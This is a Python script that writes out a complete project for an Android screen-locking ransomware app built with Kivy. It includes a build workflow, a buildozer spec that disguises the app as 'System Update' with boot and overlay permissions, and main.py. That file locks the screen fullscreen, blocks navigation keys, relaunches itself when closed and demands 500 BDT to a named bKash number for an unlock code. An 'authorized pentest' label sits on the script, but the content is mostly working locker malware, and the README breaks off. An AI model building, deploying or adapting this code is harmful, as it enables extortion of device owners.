#!/usr/bin/env python3
"""
Authorized Penetration Testing Tool
Creates complete GitHub repo with Kivy ransomware APK builder
Unlock Password: 1175251522
"""

import os
import base64
import json

# ============================================================
# PASSWORD DIRECTLY IN CODE
# ============================================================
UNLOCK_PASSWORD = "1175251522"
BKASH_NUMBER = "01866085923"
RANSOM_MESSAGE = "Send 500 BDT to this bKash number, and it will be removed automatically."

# ============================================================
# ALL FILES AS A SINGLE DICTIONARY
# ============================================================

files = {}

# ---------------------------------------
# File: .github/workflows/build.yml
# ---------------------------------------
files[".github/workflows/build.yml"] = '''
name: Build Android APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      
      - name: Install Buildozer
        run: |
          pip install buildozer cython
          sudo apt update
          sudo apt install -y \\
            git zip unzip openjdk-17-jdk \\
            python3-pip autoconf libtool \\
            pkg-config zlib1g-dev libncurses5-dev \\
            libncursesw5-dev libtinfo5 cmake \\
            libffi-dev libssl-dev
      
      - name: Build APK
        run: |
          export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
          buildozer android debug
      
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: ransomware-apk
          path: bin/*.apk
'''

# ---------------------------------------
# File: buildozer.spec
# ---------------------------------------
files["buildozer.spec"] = f'''
[app]
title = System Update
package.name = ransom
package.domain = com.pentest
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,kivy
orientation = portrait
fullscreen = 1

[buildozer]
log_level = 2
warn_on_root = 1

[permissions]
android.permissions = \\
    RECEIVE_BOOT_COMPLETED, \\
    SYSTEM_ALERT_WINDOW, \\
    WAKE_LOCK, \\
    DISABLE_KEYGUARD, \\
    FOREGROUND_SERVICE, \\
    REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, \\
    USE_FULL_SCREEN_INTENT, \\
    READ_EXTERNAL_STORAGE, \\
    WRITE_EXTERNAL_STORAGE

[meta]
description = System Update Utility
author = Pentest
'''

# ---------------------------------------
# File: main.py (THE CORE RANSOMWARE)
# ---------------------------------------
files["main.py"] = f'''
"""
Authorized Pentesting Tool - Kivy Android Ransomware
Password: {UNLOCK_PASSWORD}
"""

import os, sys, json, hashlib, threading, time
from kivy.config import Config

Config.set('graphics', 'fullscreen', 'auto')
Config.set('graphics', 'borderless', 1)
Config.set('graphics', 'resizable', 0)
Config.set('input', 'mouse', 'mouse,disable_multitouch')

from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.core.window import Window
from kivy.utils import platform
from kivy.animation import Animation
from kivy.graphics import Color, Rectangle
from kivy.metrics import dp
from kivy.clock import Clock

# ============================================================
# CONFIGURATION
# ============================================================
UNLOCK_PASSWORD = "{UNLOCK_PASSWORD}"
UNLOCK_HASH = hashlib.sha256(UNLOCK_PASSWORD.encode()).hexdigest()
BKASH_NUMBER = "{BKASH_NUMBER}"
RANSOM_MESSAGE = """{RANSOM_MESSAGE}"""
DATA_FILE = "ransom_data.json"

# ============================================================
# STATE MANAGEMENT
# ============================================================
class State:
    @staticmethod
    def is_locked():
        try:
            if os.path.exists(DATA_FILE):
                with open(DATA_FILE) as f:
                    return json.load(f).get("locked", True)
            return True
        except:
            return True
    
    @staticmethod
    def set_locked(v):
        with open(DATA_FILE, "w") as f:
            json.dump({{"locked": v}}, f)
    
    @staticmethod
    def check(pwd):
        return hashlib.sha256(pwd.encode()).hexdigest() == UNLOCK_HASH

# ============================================================
# BACKGROUND SERVICE
# ============================================================
class LockService(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.running = True
    
    def run(self):
        while self.running and State.is_locked():
            time.sleep(2)
    
    def stop(self):
        self.running = False

# ============================================================
# MAIN LAYOUT
# ============================================================
class RansomLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = "vertical"
        self.padding = [dp(30)] * 4
        self.spacing = dp(12)
        
        with self.canvas.before:
            Color(0.08, 0.08, 0.15, 1)
            self.bg = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=lambda *x: setattr(self.bg, "pos", self.pos),
                  size=lambda *x: setattr(self.bg, "size", self.size))
        
        # Spacer
        self.add_widget(Widget(size_hint=(1, 0.08)))
        
        # Warning icon
        icon = Label(text="⚠", font_size=dp(60), color=(0.9,0,0,1),
                     size_hint=(1, 0.12), halign="center")
        self.add_widget(icon)
        
        # Ransom message
        msg = Label(
            text=RANSOM_MESSAGE + "\\n\\n" + f"bKash: {BKASH_NUMBER}",
            font_size=dp(18), color=(1,0.2,0.2,1), halign="center",
            valign="middle", text_size=(Window.width*0.85, None), bold=True
        )
        self.add_widget(msg)
        
        # Spacer
        self.add_widget(Widget(size_hint=(1, 0.05)))
        
        # Password input row
        row = BoxLayout(size_hint=(0.9, 0.07), pos_hint={{"center_x": 0.5}}, spacing=dp(8))
        
        self.pwd = TextInput(
            hint_text="Enter unlock code", password=True, font_size=dp(18),
            multiline=False, size_hint=(0.7, 1),
            foreground_color=(1,1,1,1), background_color=(0.2,0.2,0.2,1),
            hint_text_color=(0.5,0.5,0.5,1)
        )
        self.pwd.bind(on_text_validate=self.unlock)
        row.add_widget(self.pwd)
        
        btn = Button(text="UNLOCK", font_size=dp(16), bold=True,
                     size_hint=(0.3, 1), background_color=(0.7,0,0,1),
                     background_normal="", color=(1,1,1,1))
        btn.bind(on_press=self.unlock)
        row.add_widget(btn)
        self.add_widget(row)
        
        # Status
        self.status = Label(text="", font_size=dp(14), color=(1,0.3,0.3,1),
                            size_hint=(1, 0.05))
        self.add_widget(self.status)
        
        # Spacer
        self.add_widget(Widget(size_hint=(1, 0.4)))
    
    def unlock(self, *args):
        pwd = self.pwd.text.strip()
        if State.check(pwd):
            anim = Animation(opacity=0, duration=0.5)
            anim.bind(on_complete=lambda *x: self._do_unlock())
            anim.start(self)
        else:
            self.status.text = "Wrong code! Try again."
            self.pwd.text = ""
            Animation(x=self.x+10, duration=0.04) + \\
            Animation(x=self.x-10, duration=0.04) + \\
            Animation(x=self.x, duration=0.04).start(self.pwd)
    
    def _do_unlock(self):
        State.set_locked(False)
        App.get_running_app().stop()

# ============================================================
# APP
# ============================================================
class RansomApp(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.title = "System Update"
        self.service = None
    
    def build(self):
        Window.fullscreen = "auto"
        Window.borderless = True
        Window.on_keyboard = self.block_keys
        Window.bind(on_request_close=lambda *x: State.is_locked())
        
        State.set_locked(True)
        self.service = LockService()
        self.service.start()
        
        if platform == "android":
            Clock.schedule_once(lambda dt: self.setup_android(), 0)
        
        return RansomLayout()
    
    def setup_android(self):
        try:
            from android import mActivity
            mActivity.getWindow().addFlags(128)  # KEEP_SCREEN_ON
            mActivity.getWindow().addFlags(0x00100000 | 0x00200000 | 0x00400000)
        except:
            pass
    
    def block_keys(self, win, key, scancode, text, modifiers):
        return key in (3, 4, 27, 82, 187)  # home, back, menu, recent
    
    def on_stop(self):
        if self.service:
            self.service.stop()
        if State.is_locked():
            os.execv(sys.executable, [sys.executable] + sys.argv)

if __name__ == "__main__":
    RansomApp().run()
'''

# ---------------------------------------
# File: requirements.txt
# ---------------------------------------
files["requirements.txt"] = '''
kivy==2.3.0
pyjnius==1.6.1
buildozer==1.5.0
'''

# ---------------------------------------
# File: README.md
# ---------------------------------------
files["README.md"] = f'''
# Ransomware Pentest App

**Authorized testing use only.** Test on devices you own.

## Unlock Password
